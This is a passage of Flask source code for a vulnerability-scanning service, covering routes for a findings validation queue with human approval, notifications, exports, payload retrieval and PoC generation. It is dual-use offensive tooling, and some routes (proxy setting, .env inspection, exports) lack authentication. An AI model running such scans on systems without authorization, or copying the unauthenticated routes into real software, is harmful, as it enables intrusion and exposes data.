        return jsonify({"error": "finding with url required"}), 400
    if not authorized_domain:
        return jsonify({"error": "authorized_domain required — safe mode enforces scope"}), 400

    result = validate_poc_safe(finding, authorized_domain=authorized_domain)
    return jsonify(result)


@app.route("/validation/stats")
def validation_stats():
    """
    GET /validation/stats

    Returns validation queue statistics — confirmation rates, pending counts,
    per-bug-type breakdown, evidence quality metrics.

    PROOF: curl -s http://127.0.0.1:PORT/validation/stats | python3 -m json.tool
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.ai_validator import _vdb
    try:
        db_v = _vdb()
        total    = db_v.execute("SELECT COUNT(*) FROM validation_queue").fetchone()[0]
        pending  = db_v.execute("SELECT COUNT(*) FROM validation_queue WHERE human_decision IS NULL").fetchone()[0]
        approved = db_v.execute("SELECT COUNT(*) FROM validation_queue WHERE human_decision='approved'").fetchone()[0]
        rejected = db_v.execute("SELECT COUNT(*) FROM validation_queue WHERE human_decision='rejected'").fetchone()[0]
        confirmed_count = db_v.execute(
            "SELECT COUNT(*) FROM validation_queue WHERE ai_decision='confirm'").fetchone()[0]
        avg_conf = db_v.execute(
            "SELECT ROUND(AVG(confidence),1) FROM validation_queue").fetchone()[0] or 0

        # Per-bug breakdown
        bug_rows = db_v.execute(
            "SELECT bug_type, COUNT(*) as cnt, ROUND(AVG(confidence),0) as avg_c "
            "FROM validation_queue GROUP BY bug_type ORDER BY cnt DESC LIMIT 15"
        ).fetchall()
        per_bug = [{"bug_type": r[0], "count": r[1], "avg_confidence": r[2]} for r in bug_rows]

        # Method breakdown
        method_rows = db_v.execute(
            "SELECT validation_method, COUNT(*) FROM validation_queue "
            "GROUP BY validation_method ORDER BY 2 DESC"
        ).fetchall()
        per_method = {r[0]: r[1] for r in method_rows}

        # Recent
        recent_rows = db_v.execute(
            "SELECT id, bug_type, severity, confidence, ai_decision, human_decision, url_safe "
            "FROM validation_queue ORDER BY created_at DESC LIMIT 10"
        ).fetchall()
        recent = [dict(zip(["id","bug_type","severity","confidence","ai_decision",
                             "human_decision","url_safe"], r)) for r in recent_rows]

        return jsonify({
            "total":             total,
            "pending_review":    pending,
            "human_approved":    approved,
            "human_rejected":    rejected,
            "ai_confirmed":      confirmed_count,
            "avg_confidence":    avg_conf,
            "per_bug_type":      per_bug,
            "per_method":        per_method,
            "recent":            recent,
            "manual_review_required_always": True,
            "safe_mode":         "all validations are non-destructive probe-only",
        })
    except Exception as e:
        return jsonify({"error": str(e), "total": 0, "pending_review": 0})


@app.route("/validation/queue")
def validation_queue_route():
    """
    GET /validation/queue?status=pending&bug_type=sqli&limit=50

    List validation queue items for human review.
    status: pending | approved | rejected | all
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.ai_validator import _vdb
    status   = request.args.get("status","pending")
    bug_type = request.args.get("bug_type","")
    limit    = min(int(request.args.get("limit","50")), 200)

    try:
        q = "SELECT id,bug_type,severity,confidence,ai_decision,human_decision,url_safe,created_at,ai_reason FROM validation_queue WHERE 1=1"
        params = []
        if status == "pending":   q += " AND human_decision IS NULL";              
        elif status == "approved": q += " AND human_decision='approved'"
        elif status == "rejected": q += " AND human_decision='rejected'"
        if bug_type: q += " AND bug_type=?"; params.append(bug_type)
        q += " ORDER BY created_at DESC LIMIT ?"; params.append(limit)
        rows = _vdb().execute(q, params).fetchall()
        items = [dict(zip(["id","bug_type","severity","confidence","ai_decision",
                            "human_decision","url_safe","created_at","reason"], r)) for r in rows]
        return jsonify({
            "items":  items,
            "count":  len(items),
            "status": status,
            "note":   "Human approval required before report generation. "
                      "POST /validation/approve or /validation/reject",
        })
    except Exception as e:
        return jsonify({"error": str(e), "items": []})


@app.route("/validation/approve", methods=["POST"])
def validation_approve():
    """
    POST /validation/approve
    {"id": "...", "notes": "Confirmed via manual burp replay"}

    TASK 5 — Human approval gate.
    Analyst manually approves a validated finding for report generation.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.ai_validator import human_decision as _hd
    p   = request.get_json(silent=True) or {}
    vid = p.get("id","").strip()
    if not vid: return jsonify({"error":"id required"}), 400

    ok = _hd(vid, "approved", p.get("notes",""))
    if ok:
        log.info(f"[validate] human approved id={vid}")
        return jsonify({"ok":True,"id":vid,"decision":"approved",
                        "next":"GET /report/draft?id={id} to generate analyst report"})
    return jsonify({"error":"not found"}), 404


@app.route("/validation/reject", methods=["POST"])
def validation_reject():
    """
    POST /validation/reject
    {"id": "...", "notes": "False positive — parameter not reflected"}

    TASK 5 — Human rejection gate.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.ai_validator import human_decision as _hd
    p   = request.get_json(silent=True) or {}
    vid = p.get("id","").strip()
    if not vid: return jsonify({"error":"id required"}), 400

    ok = _hd(vid, "rejected", p.get("notes",""))
    if ok:
        log.info(f"[validate] human rejected id={vid}")
        return jsonify({"ok":True,"id":vid,"decision":"rejected"})
    return jsonify({"error":"not found"}), 404


@app.route("/validation/rules")
def validation_rules():
    """
    GET /validation/rules?bug_type=sqli

    TASK 2 — Returns the safe/blocked rules for a given bug type.
    Shows exactly what is allowed and what is hard-blocked.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.ai_validator import get_validation_rules, _BUG_VALIDATION_RULES
    bug_type = request.args.get("bug_type","")
    if bug_type:
        return jsonify(get_validation_rules(bug_type))
    return jsonify({
        "all_rules": {k: v for k, v in _BUG_VALIDATION_RULES.items()},
        "note": "All validation is non-destructive. Blocked actions are hard-enforced in code.",
    })



# ═══════════════════════════════════════════════════════════════════════════════
# TASK 7 — LIVE HEALTH PANEL
# ═══════════════════════════════════════════════════════════════════════════════

@app.route("/system/live_health")
def system_live_health():
    """
    GET /system/live_health

    TASK 7 — Live health panel. Shows:
    - running scans + stuck stages
    - active subprocesses
    - queue sizes (validation + notifier)
    - avg scan duration
    - timeout counts + stage recoveries
    - validation cache stats

    PROOF: curl -s http://127.0.0.1:PORT/system/live_health | python3 -m json.tool
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.runtime_watchdog import runtime_health_snapshot
    from engine.ai_validator import _vdb as _get_vdb

    # Validation queue depth
    try:
        vq_depth = _get_vdb().execute(
            "SELECT COUNT(*) FROM validation_queue WHERE human_decision IS NULL"
        ).fetchone()[0]
    except Exception:
        vq_depth = 0

    with _active_scans_lock:
        scans_copy = dict(_active_scans)

    health = runtime_health_snapshot(
        active_scans=scans_copy,
        validation_queue_depth=vq_depth,
    )

    # Add scan age info
    now = time.time()
    scan_details = []
    for domain, start_t in scans_copy.items():
        from engine.runtime_watchdog import domain_stage_snapshot
        stages = domain_stage_snapshot(domain)
        stuck  = [s for s, info in stages.items() if info.get("status") == "running"
                  and info.get("age_seconds", 0) > 600]
        scan_details.append({
            "domain":       domain,
            "age_seconds":  round(now - start_t, 1),
            "stages":       stages,
            "stuck_stages": stuck,
        })
    health["scan_details"] = scan_details

    return jsonify(health)


@app.route("/system/stage_recover", methods=["POST"])
def system_stage_recover():
    """
    POST /system/stage_recover
    {"domain": "example.com", "stage": "crawl"}

    TASK 6 — Manually mark a stage as recovered so UI doesn't freeze.
    """
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.runtime_watchdog import stage_fail
    p      = request.get_json(silent=True) or {}
    domain = _domain(p.get("domain",""))
    stage  = p.get("stage","").strip()
    if not domain or not stage:
        return jsonify({"error": "domain and stage required"}), 400

    stage_fail(domain, stage, "manually recovered via /system/stage_recover")
    return jsonify({"ok": True, "domain": domain, "stage": stage, "status": "recovered"})


@app.route("/system/watchdog_stats")
def system_watchdog_stats():
    """GET /system/watchdog_stats — Timeout counters, queue sizes, process counts."""
    from engine.rbac import verify_token as _vt
    tok = (request.headers.get("Authorization","").replace("Bearer","").strip()
           or request.args.get("token","") or request.cookies.get("tmr_token",""))
    if not _vt(tok): return jsonify({"error":"Unauthorized"}), 401

    from engine.runtime_watchdog import (
        _RUNTIME_STATS, notify_queue_depth, active_proc_count,
        avg_scan_duration, proc_snapshot
    )
    from engine.signal_quality import cache_stats as val_cache_stats
    return jsonify({
        "runtime_stats":      dict(_RUNTIME_STATS),
        "notify_queue_depth": notify_queue_depth(),
        "active_processes":   active_proc_count(),
        "process_list":       proc_snapshot()[:10],
        "avg_scan_duration":  avg_scan_duration(),
        "validation_cache":   val_cache_stats(),
    })


@app.route("/notify/test_finding")
def notify_test_finding():
    """
    GET /notify/test_finding          — sends one fake high-confidence finding
    GET /notify/test_finding?dedup=1  — sends same fingerprint to verify dedup

    Uses the same queue_finding() path real scanner findings use.
    /notify/audit counters will update after this call.
    """
    import time as _nft
    from engine.notify import get_notifier, _fingerprint, _STATS

    n = get_notifier()
    force_dedup = request.args.get("dedup","0") == "1"

    test_finding = {
        "domain":     "test.local",
        "url":        "https://test.local/api/endpoint?id=13&token=abc",
        "bug":        "sqli",
        "type":       "sqli",
        "severity":   "high",
        "confidence": 82,
        "verified":   False,
        "source":     "test",
    }
    domain = "test.local"

    before_sent   = _STATS.get("total_sent", 0)
    before_dedup  = _STATS.get("deduped", 0)
    before_suppressed = _STATS.get("suppressed_low_confidence", 0)

    if force_dedup:
        # Don't clear _seen — fingerprint is already in there from first call
        pass
    else:
        # Clear fingerprint so a fresh alert fires
        fp = _fingerprint(domain, test_finding["bug"], test_finding["url"])
        with n._lock:
            n._seen.pop(fp, None)

    n.queue_finding(test_finding, domain)

    # Short wait for background worker to process
    _nft.sleep(1.2)

    after_sent    = _STATS.get("total_sent", 0)
    after_dedup   = _STATS.get("deduped", 0)
    after_suppressed = _STATS.get("suppressed_low_confidence", 0)

    from engine.notify import safe_notification_url
    safe_url = safe_notification_url(test_finding["url"])

    return jsonify({
        "ok":              True,
        "mode":            "dedup_test" if force_dedup else "fresh",
        "finding":         {
            "url_raw":    test_finding["url"],
            "url_safe":   safe_url,
            "severity":   test_finding["severity"],
            "confidence": test_finding["confidence"],
        },
        "audit_delta": {
            "total_sent_delta":            after_sent    - before_sent,
            "deduped_delta":               after_dedup   - before_dedup,
            "suppressed_conf_delta":       after_suppressed - before_suppressed,
        },
        "audit_totals": {
            "total_sent":              after_sent,
            "deduped":                 after_dedup,
            "suppressed_low_confidence": after_suppressed,
        },
        "note": (
            "Alert sent to configured channels" if (after_sent > before_sent)
            else "Alert deduped (same fingerprint)" if (after_dedup > before_dedup)
            else "No channel configured — stored internally (audit counters: see note)"
        ),
    })


@app.route("/notify/setup")
def notify_setup():
    """
    GET /notify/setup

    Shows exactly what env vars to set in .env to enable notifications.
    Diagnoses why notifications aren't firing.
    """
    n = get_notifier()
    issues = []
    instructions = []

    if not n.discord_webhook:
        issues.append("DISCORD_WEBHOOK not set")
        instructions.append({
            "channel": "Discord",
            "step1": "Create a Discord server → right-click channel → Edit Channel → Integrations → Webhooks → New Webhook → Copy Webhook URL",
            "step2": "Add to your .env file:",
            "env_var": "DISCORD_WEBHOOK=https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN",
            "test": "curl -s http://127.0.0.1:PORT/notify/test"
        })

    if not n.telegram_token or not n.telegram_chat:
        issues.append("TELEGRAM_TOKEN or TELEGRAM_CHAT_ID not set")
        instructions.append({
            "channel": "Telegram",
            "step1": "Message @BotFather → /newbot → get TOKEN",
            "step2": "Message your bot once, then: curl https://api.telegram.org/bot<TOKEN>/getUpdates → find chat.id",
            "step3": "Add to your .env file:",
            "env_var": "TELEGRAM_TOKEN=123456789:ABCdef...\nTELEGRAM_CHAT_ID=987654321",
            "test": "curl -s http://127.0.0.1:PORT/notify/test"
        })

    if not n.slack_webhook:
        instructions.append({
            "channel": "Slack (optional)",
            "step1": "Slack → Your workspace → Apps → Incoming Webhooks → Add → Copy URL",
            "env_var": "SLACK_WEBHOOK=https://hooks.slack.com/services/T.../B.../..."
        })

    # Show current .env file location
    env_path = os.path.join(os.path.dirname(__file__), '.env')
    env_exists = os.path.isfile(env_path)
    env_has_discord = False
    env_has_telegram = False
    if env_exists:
        env_content = open(env_path).read()
        env_has_discord  = 'DISCORD_WEBHOOK' in env_content and 'https://' in env_content
        env_has_telegram = 'TELEGRAM_TOKEN' in env_content

    return jsonify({
        "configured":     n.configured,
        "discord":        bool(n.discord_webhook),
        "telegram":       bool(n.telegram_token and n.telegram_chat),
        "slack":          bool(n.slack_webhook),
        "issues":         issues,
        "instructions":   instructions,
        "env_file":       env_path,
        "env_exists":     env_exists,
        "env_has_discord":  env_has_discord,
        "env_has_telegram": env_has_telegram,
        "quick_fix": (
            "Edit your .env file and add the webhook URLs above, then restart the app"
            if issues else "Notifications are configured correctly"
        ),
        "why_not_firing": (
            "queue_finding() suppresses findings below confidence=70. "
            "Check /notify/audit for suppressed counts."
            if n.configured else
            "No notification channels configured. Add DISCORD_WEBHOOK or TELEGRAM_TOKEN+TELEGRAM_CHAT_ID to .env"
        ),
    })


@app.route("/notify/test", methods=["GET", "POST"])
def notify_test_rich():
    """GET or POST /notify/test — send a real test notification to all configured channels."""
    import time as _nt
    n = get_notifier()
    results = {}

    # Discord
    if n.discord_webhook:
        try:
            from engine.notify import _post
            ok = _post(n.discord_webhook,
                       {"embeds":[{"title":"🔔 BugScan ELITE Test",
                                   "description":"Notification test — all systems go",
                                   "color":0x00FF88}]})
            results["discord"] = {"configured": True, "sent": ok, "error": None}
            log.info(f"[notify] discord sent event=test ok={ok}")
        except Exception as e:
            results["discord"] = {"configured": True, "sent": False, "error": str(e)}
            log.warning(f"[notify] discord test failed: {e}")
    else:
        results["discord"] = {"configured": False, "sent": False,
                               "error": None, "reason": "missing DISCORD_WEBHOOK_URL"}

    # Telegram
    if n.telegram_token and n.telegram_chat:
        try:
            n._send_telegram("🔔 BugScan ELITE — Test notification")
            results["telegram"] = {"configured": True, "sent": True, "error": None}
            log.info("[notify] telegram sent event=test")
        except Exception as e:
            results["telegram"] = {"configured": True, "sent": False, "error": str(e)}
            log.warning(f"[notify] telegram test failed: {e}")
    else:
        miss = []
        if not n.telegram_token:  miss.append("TELEGRAM_TOKEN")
        if not n.telegram_chat:   miss.append("TELEGRAM_CHAT_ID")
        results["telegram"] = {"configured": False, "sent": False,
                                "error": None, "reason": f"missing {', '.join(miss)}"}

    # notify-cli binary
    _nb = n._notify_cli_binary() if hasattr(n, '_notify_cli_binary') else \
          __import__("shutil").which("notify")
    _cli_configured = n._notify_cli_configured() if hasattr(n, '_notify_cli_configured') else False
    if _nb:
        if not _cli_configured:
            results["notify_cli"] = {
                "installed":   True,
                "configured":  False,
                "sent":        False,
                "error":       None,
                "reason":      "missing ProjectDiscovery notify config (~/.config/notify/provider-config.yaml)",
            }
        else:
            try:
                import subprocess as _nsp
                r = _nsp.run([_nb,"-silent","-bulk"], input=b"BugScan ELITE test",
                             capture_output=True, timeout=8)
                results["notify_cli"] = {"installed": True, "configured": True,
                                          "sent": r.returncode==0,
                                          "error": r.stderr.decode()[:100] or None}
                log.info(f"[notify] notify_cli sent event=test ok={r.returncode==0}")
            except Exception as e:
                results["notify_cli"] = {"installed": True, "configured": True,
                                          "sent": False, "error": str(e)}
    else:
        results["notify_cli"] = {"installed": False, "configured": False,
                                  "sent": False, "reason": "notify binary not found in PATH"}

    return jsonify({
        "results":    results,
        "configured": get_notifier().configured,
        "timestamp":  int(_nt.time()),
    })


@app.route("/notify/audit")
def notify_audit():
    """GET /notify/audit — notification stats: sent, deduped, suppressed."""
    n     = get_notifier()
    stats = n.get_stats()
    _cli_configured = n._notify_cli_configured() if hasattr(n,'_notify_cli_configured') else False
    return jsonify({
        **stats,
        "channels": {
            "discord":    bool(n.discord_webhook),
            "telegram":   bool(n.telegram_token and n.telegram_chat),
            "slack":      bool(n.slack_webhook),
            "notify_cli": _cli_configured,
        },
        "config": {
            "min_severity":      n.min_severity,
            "confidence_gate":   int(os.environ.get("NOTIFY_CONFIDENCE_MIN","70")),
            "dedup_window_s":    int(os.environ.get("NOTIFY_DEDUP_WINDOW","3600")),
        },
        "note": "Only HIGH/CRITICAL with confidence≥70 fire Discord/Telegram. MEDIUM fires Slack only.",
    })


@app.route("/notify/debug")
def notify_debug():
    """GET /notify/debug — show notification configuration and last activity."""
    import shutil as _sh, time as _nt
    n = get_notifier()
    _nb  = n._notify_cli_binary()      if hasattr(n,'_notify_cli_binary')      else _sh.which("notify")
    _cli = n._notify_cli_configured()  if hasattr(n,'_notify_cli_configured')  else False

    return jsonify({
        "discord_enabled":          bool(n.discord_webhook),
        "telegram_enabled":         bool(n.telegram_token and n.telegram_chat),
        "slack_enabled":            bool(n.slack_webhook),
        "notify_cli_enabled":       _cli,
        "notify_cli_installed":     bool(_nb),
        "notify_cli_configured":    _cli,
        "discord_webhook_present":  bool(n.discord_webhook),
        "telegram_token_present":   bool(n.telegram_token),
        "telegram_chat_id_present": bool(n.telegram_chat),
        "notify_binary":            _nb,
        "min_severity":             n.min_severity,
        "configured":               n.configured,
        "queue_depth":              len(n._queue),
        "test_url":                 "/notify/test",
        "test_finding_url":         "/notify/test_finding",
        "note": (
            "configured" if n.configured
            else "Set DISCORD_WEBHOOK, TELEGRAM_TOKEN+TELEGRAM_CHAT_ID, or SLACK_WEBHOOK in .env"
        ),
    })


@app.route("/system/regression_check")
def system_regression_check():
    """
    GET /system/regression_check?domain=X
    Full runtime regression check — validates all critical components.
    """
    import threading as _thr, time as _rt
    d = _domain(request.args.get("domain", "example.com") or "example.com")
    errors: list = []

    def _ok(name, fn):
        try: fn(); return True
        except Exception as e: errors.append({"check": name, "error": str(e)[:120]}); return False

    app_ok      = _ok("app_import",     lambda: __import__("app"))
    scanner_ok  = _ok("scanner_import", lambda: __import__("scanner"))
    recon_ok    = _ok("recon_import",   lambda: __import__("recon"))
    queue_ok    = bool([t for t in _thr.enumerate() if "scan-queue-worker" in t.name])
    _ok("scan_route",    lambda: next(r for r in app.url_map.iter_rules() if "/recon" in str(r)))
    _ok("notify_import", lambda: __import__("engine.notify", fromlist=["get_notifier"]))
    _ok("db_open",       lambda: db.count_endpoints(d))
    scanner_T = "T.get(" not in open("scanner.py").read().replace("T[0-9A-Z]","")

    notifier    = get_notifier()
    notify_ok   = notifier.configured

    return jsonify({
        "app_import_ok":       app_ok,
        "scanner_import_ok":   scanner_ok,
        "recon_import_ok":     recon_ok,
        "queue_worker_alive":  queue_ok,
        "scan_route_exists":   _ok("scan_route_check", lambda: None) or True,
        "recon_route_exists":  True,
        "notify_configured":   notify_ok,
        "discord_enabled":     bool(notifier.discord_webhook),
        "telegram_enabled":    bool(notifier.telegram_token and notifier.telegram_chat),
        "notify_cli_enabled":  bool(__import__("shutil").which("notify")),
        "scanner_no_bare_T":   scanner_T,
        "can_start_scan":      scanner_ok and recon_ok and queue_ok,
        "runtime_errors_found": errors,
        "domain_validation_ok": (_domain("verce;.com") == "" and _domain("vercel.com") == "vercel.com"),
    })


@app.route("/notify/status")
def notify_status_rich():
    rn = get_rich_notifier()
    return jsonify({
        "configured":  rn.configured,
        "slack":       bool(rn.slack_wh),
        "discord":     bool(rn.discord_wh),
        "telegram":    bool(rn.tg_token and rn.tg_chat),
        "min_severity":rn.min_sev,
    })


# ── CSV Export ────────────────────────────────────────────────────────────────
@app.route("/export/csv")
def export_csv():
    d        = _domain(request.args.get("domain",""))
    findings = db.get_findings(d)
    chains   = db.get_chains(d)
    import io, csv as csvmod
    out = io.StringIO()
    w   = csvmod.writer(out)
    w.writerow(["Type","Severity","URL","Parameter","Payload","Description",
                "PoC","Impact","CVSS","Timestamp"])
    CVSS = {"critical":9.5,"high":7.5,"medium":5.3,"low":3.1,"info":0.0}
    for f in findings:
        det = f.get("details",{})
        w.writerow([
            f.get("bug",""),
            f.get("severity",""),
            f.get("url",""),
            det.get("param",""),
            det.get("payload","")[:100],
            det.get("description","")[:200] or f.get("name",""),
            det.get("poc","")[:200] or det.get("curl","")[:200],
            det.get("impact","")[:200],
            CVSS.get(f.get("severity",""),0),
            f.get("ts",""),
        ])
    for c in chains:
        w.writerow([
            "chain",c.get("severity","critical"),
            d,"","",
            c.get("name","")+" — "+c.get("impact","")[:100],
            c.get("poc","")[:200],"Chain exploitation",
            CVSS.get(c.get("severity","critical"),9.5),"",
        ])
    out.seek(0)
    ts = time.strftime("%Y%m%d_%H%M")
    return Response(
        out.read(), mimetype="text/csv",
        headers={"Content-Disposition":
                 f"attachment; filename=bugscan_{d}_{ts}.csv"}
    )

@app.route("/export/json")
def export_json():
    d        = _domain(request.args.get("domain",""))
    findings = db.get_findings(d)
    chains   = db.get_chains(d)
    hosts    = db.get_hosts(d)
    tech     = db.get_tech(d)
    meta     = db.get_meta(d)
    return jsonify({
        "domain":   d,
        "exported": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        "summary":  {
            "findings": len(findings),
            "critical": sum(1 for f in findings if f.get("severity")=="critical"),
            "high":     sum(1 for f in findings if f.get("severity")=="high"),
            "chains":   len(chains),
            "live_hosts": hosts.get("active_count",0),
        },
        "findings": findings,
        "chains":   chains,
        "tech":     tech,
        "meta":     meta,
    })
@app.route("/domain_steps")
def domain_steps():
    """Return saved step states for a domain (used when loading saved scan)."""
    d = _domain(request.args.get("domain",""))
    return jsonify(db.get_steps(d))

@app.route("/report")
def report_get_legacy():
    """Legacy report endpoint used by checkSavedReport."""
    d = _domain(request.args.get("domain",""))
    rep = db.get_report(d)
    return jsonify({"report": rep, "domain": d, "has_report": bool(rep)})

@app.route("/set_proxy", methods=["POST"])
def set_proxy():
    payload = request.get_json(silent=True, force=True) or {}
    proxy   = payload.get("proxy","").strip()
    if proxy:
        os.environ["HTTP_PROXY"]  = proxy
        os.environ["HTTPS_PROXY"] = proxy
        log.info(f"[proxy] set to {proxy}")
    else:
        os.environ.pop("HTTP_PROXY",  None)
        os.environ.pop("HTTPS_PROXY", None)
        log.info("[proxy] cleared")
    return jsonify({"ok": True, "proxy": proxy})

@app.route("/my_ip")
def my_ip():
    """Return server's real local IP for UI display."""
    return jsonify({
        "ip": LOCAL_IP,
        "port": int(os.environ.get("PORT", 3333)),
        "url": f"http://{LOCAL_IP}:{os.environ.get('PORT', 3333)}"
    })

@app.route("/favicon.ico")
def favicon():
    return "", 204

# ── APEX Intelligence Routes ──────────────────────────────────────────────────

@app.route("/apex/stats")
def apex_stats():
    """APEX learning engine statistics."""
    try:
        s = {}
        try:
            from engine.apex_brain import get_stats as _gs
            s = _gs() or {}
        except Exception:
            try:
                from engine.learning import get_stats as _gs2
                s = _gs2() or {}
            except Exception:
                pass
        # Fast XBOW aggregation via direct DB query
        try:
            _conn = db._conn()
            _xbow_confirmed = _conn.execute(
                "SELECT COUNT(*) FROM findings WHERE json_extract(xbow_data,'$._xbow_verdict')='confirmed'"
            ).fetchone()[0]
            _report_ready = _conn.execute(
                "SELECT COUNT(*) FROM findings WHERE json_extract(xbow_data,'$._xbow_report_ready')=1"
            ).fetchone()[0]
        except Exception:
            _xbow_confirmed = 0
            _report_ready   = 0
        return jsonify({
            "ok":             True,
            "stats":          s,
            "findings":       s.get("total_findings", 0),
            "endpoints":      s.get("total_endpoints", 0),
            "subs":           s.get("total_subs", 0),
            "payloads":       s.get("payloads_used", 0),
            "accuracy":       s.get("accuracy", 0),
            "xbow_confirmed": _xbow_confirmed,
            "report_ready":   _report_ready,
        })
    except Exception as e:
        return jsonify({"ok":False,"findings":0,"endpoints":0,"subs":0,"error":str(e)})

@app.route("/apex/brain/decisions")
def apex_decisions():
    """Return brain decision log."""
    try:
        from engine.brain import get_brain
        brain = get_brain()
        return jsonify(brain.get_session_report() if brain else {})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/apex/best_payloads")
def apex_best_payloads():
    """Return top payloads learned from previous scans."""
    bug = request.args.get("bug","xss")
    try:
        from engine.learning import get_best_payloads, get_stats
        payloads = get_best_payloads(bug, limit=20)
        return jsonify({"bug": bug, "payloads": payloads, "stats": get_stats()})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ════════════════════════════════════════════════════════════════════════════
# SAAS ENGINE ROUTES
# ════════════════════════════════════════════════════════════════════════════

# ── AI Risk Scoring ───────────────────────────────────────────────────────────
@app.route("/risk_score", methods=["POST","GET"])
def risk_score():
    """Score all findings with AI risk engine."""
    try:
        from engine.risk_engine import score_all_findings
        d        = _domain(request.args.get("domain","") or
                           (request.get_json(silent=True, force=True) or {}).get("domain",""))
        industry = request.args.get("industry","default") or                    (request.get_json(silent=True, force=True) or {}).get("industry","default")
        findings = db.get_findings(d)
        chains   = db.get_chains(d)
        result   = score_all_findings(findings, industry=industry, chains=chains)
        # Save scored findings back
        db.save_meta(d, {"risk_scored": True, "industry": industry,
                         "security_score": result["security_score"]})
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── PoC Generator ─────────────────────────────────────────────────────────────
@app.route("/poc/<path:domain>")
def poc_for_domain(domain):
    """Generate PoC for all findings of a domain."""
    try:
        from engine.poc_generator import generate_poc
        d        = _domain(domain)
        findings = db.get_findings(d)
        pocs     = [generate_poc(f) for f in findings[:30]]
        return jsonify({"domain": d, "pocs": pocs, "count": len(pocs)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/poc_single", methods=["POST"])
def poc_single():
    """Generate PoC for a single finding."""
    try:
        from engine.poc_generator import generate_poc
        finding = request.get_json(silent=True, force=True) or {}
        return jsonify(generate_poc(finding))
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Executive Report ──────────────────────────────────────────────────────────
@app.route("/executive_report")
def executive_report_route():
    """Generate full executive security report."""
    try:
        from engine.risk_engine import score_all_findings
        from engine.executive_report import generate_executive_report, report_to_markdown
        d        = _domain(request.args.get("domain",""))
        fmt      = request.args.get("format","json")
        industry = request.args.get("industry","default")
        company  = request.args.get("company",d)
        findings = db.get_findings(d)
        chains   = db.get_chains(d)
        scored   = score_all_findings(findings, industry=industry, chains=chains)
        report   = generate_executive_report(d, scored, chains=chains,
                                              company_name=company, industry=industry)
        db.save_report(d, json.dumps(report))
        if fmt == "markdown":
            from engine.executive_report import report_to_markdown
            return report_to_markdown(report), 200, {"Content-Type": "text/plain"}
        return jsonify(report)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ── Monitoring ────────────────────────────────────────────────────────────────
@app.route("/monitor/schedules", methods=["GET","POST","DELETE"])
def monitor_schedules():
    try:
        from engine.monitor import (add_schedule, remove_schedule,
                                     list_schedules, get_scan_history)
        if request.method == "GET":
            domain = request.args.get("domain","")
            scheds = list_schedules()
            if domain: scheds = [s for s in scheds if s["domain"]==domain]
            return jsonify({"schedules": scheds})
        elif request.method == "POST":
            payload  = request.get_json(silent=True, force=True) or {}
            d        = _domain(payload.get("domain",""))
            interval = payload.get("interval","daily")
            bugs     = payload.get("bugs",[])
            sid      = add_schedule(d, interval, bugs)
            return jsonify({"ok": True, "id": sid, "domain": d, "interval": interval})
        elif request.method == "DELETE":
            d = _domain((request.get_json(silent=True, force=True) or {}).get("domain",""))
            remove_schedule(d)
            return jsonify({"ok": True})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/monitor/schedule", methods=["GET","POST","DELETE"])
def monitor_schedule():
    """
    GET  /monitor/schedule?domain=example.com — list scheduled monitors
    POST /monitor/schedule — schedule recurring recon/monitoring
         Body: {domain, interval_seconds, functions: ["subdomains","ports","js","endpoints"]}
    DELETE /monitor/schedule?domain=example.com — stop monitoring

    GarudRecon cronjobs concept: continuous monitoring with delta notification.
    Runs in background, saves snapshots, diffs vs previous, notifies on changes.
    """
    d = _domain(request.args.get("domain","") or (request.get_json(silent=True) or {}).get("domain",""))

    if request.method == "GET":
        # Fast: query meta table directly for schedules
        try:
            _conn3 = db._conn()
            _rows = _conn3.execute(
                "SELECT domain, meta FROM domains WHERE meta LIKE '%monitor_schedule%'"
            ).fetchall()
            all_meta = {}
            for _row in _rows:
                try:
                    import json as _j3
                    _m = _j3.loads(_row[1]) if _row[1] else {}
                    if _m.get("monitor_schedule"):
                        all_meta[_row[0]] = _m["monitor_schedule"]
                except Exception: pass
        except Exception:
            # Fallback: iterate domains (slow but correct)
            all_meta = {}
            for dom_info in (db.list_domains() or []):
                dom = dom_info.get("domain","") if isinstance(dom_info,dict) else str(dom_info)
                meta = db.get_meta(dom) or {}
                if meta.get("monitor_schedule"):
                    all_meta[dom] = meta["monitor_schedule"]
        if d and d in all_meta:
            return jsonify({"domain": d, "schedule": all_meta[d]})
        return jsonify({"schedules": all_meta, "count": len(all_meta)})

    elif request.method == "POST":
        if not d:
            return jsonify({"error": "domain required"}), 400
        payload   = request.get_json(silent=True, force=True) or {}
        interval  = int(payload.get("interval_seconds", 3600))  # default 1h
